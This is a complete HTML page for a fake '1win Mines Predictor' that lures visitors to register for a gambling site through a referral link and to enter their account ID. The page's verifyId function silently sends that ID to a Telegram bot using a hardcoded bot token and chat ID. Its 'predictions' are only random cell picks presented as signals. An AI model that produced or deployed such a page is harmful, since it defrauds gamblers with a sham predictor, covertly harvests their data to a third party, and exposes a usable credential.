<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Milko Mines Predictor</title>
    <style>
        body { margin: 0; padding: 0; background: linear-gradient(135deg, #1f2937, #111827); color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 90%; max-width: 400px; text-align: center; background: #1f2937; padding: 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { display: block; width: 100%; padding: 12px; margin-top: 10px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .input-field { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; box-sizing: border-box; }
        .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 5px; margin-top: 15px; }
        .cell { width: 100%; aspect-ratio: 1; background: #374151; border-radius: 4px; display: flex; justify-content: center; align-items: center; }
        .star { background: #f59e0b; color: white; font-size: 20px; }
    </style>
</head>
<body>

<!-- AUTH PAGE -->
<div class="container" id="authPage">
    <h2>1WIN MINES PREDICTOR</h2>
    <input type="number" id="userId" class="input-field" placeholder="Enter your 1win User ID">
    <a href="https://lkqz.cc/a07b09" target="_blank" class="btn" style="background:#10b981;">1. Register on 1win</a>
    <button class="btn" onclick="verifyId()">2. Verify ID & Access</button>
</div>

<!-- DASHBOARD -->
<div class="container" id="dashboardPage" style="display:none;">
    <h1>SELECT MINES GAME</h1>
    <div class="game-grid">
        <div class="game-card" onclick="openGame('Mines')">⭐ Mines</div>
        <div class="game-card" onclick="openGame('Mines Royal')">👑 Mines Royal</div>
    </div>
</div>

<!-- GAME PLAY -->
<div class="container" id="gamePlayPage" style="display:none;">
    <h1 id="activeGameTitle">MINES MATRIX</h1>
    <div class="bomb-selector">
        <p>Select Mines Count:</p>
        <button class="btn" onclick="setBombs(3)">3 Mines</button>
        <button class="btn" onclick="setBombs(5)">5 Mines</button>
        <button class="btn" onclick="setBombs(7)">7 Mines</button>
    </div>
    <p>Selected Mines: <span id="bombCount">3</span></p>
    <div class="mines-grid" id="matrixGrid"></div>
    <button class="btn" onclick="generateMinesSignal()">⚡ Generate Next Grid</button>
    <button class="btn" style="background: grey;" onclick="backToMenu()">⬅️ Back</button>
</div>

<script>
    let currentBombs = 3;

    function setBombs(count) {
        currentBombs = count;
        document.getElementById('bombCount').innerText = count;
    }

    function verifyId() {
        var id = document.getElementById('userId').value;
        if(id === "" || id.length < 4) { alert("Please enter a valid 1win ID!"); return; }
        
        // የቴሌግራም መረጃህን እዚህ አስገባ
        var botToken = "8951097439:AAF61a6or1B15jefCSze4R2e-qJItS3CcA0"; 
        var chatId = "5555698804";
        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=New User ID: " + id;
        fetch(url);

        document.getElementById('authPage').style.display = 'none';
        document.getElementById('dashboardPage').style.display = 'block';
    }

    function openGame(name) {
        document.getElementById('activeGameTitle').innerText = name;
        document.getElementById('dashboardPage').style.display = 'none';
        document.getElementById('gamePlayPage').style.display = 'block';
        buildGrid();
    }

    function backToMenu() {
        document.getElementById('gamePlayPage').style.display = 'none';
        document.getElementById('dashboardPage').style.display = 'block';
    }

    function buildGrid() {
        var grid = document.getElementById('matrixGrid');
        grid.innerHTML = '';
        for (var i = 0; i < 25; i++) {
            var cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            grid.appendChild(cell);
        }
    }

    function generateMinesSignal() {
        buildGrid();
        let starsToOpen = (currentBombs === 3) ? 5 : 3;
        var starPositions = [];
        while(starPositions.length < starsToOpen) {
            var randomIdx = Math.floor(Math.random() * 25);
            if(!starPositions.includes(randomIdx)) starPositions.push(randomIdx);
        }
        starPositions.forEach(function(idx) {
            var cell = document.getElementById('cell-' + idx);
            cell.className = 'cell star';
            cell.innerText = '⭐';
        });
    }
</script>
</body>
</html>
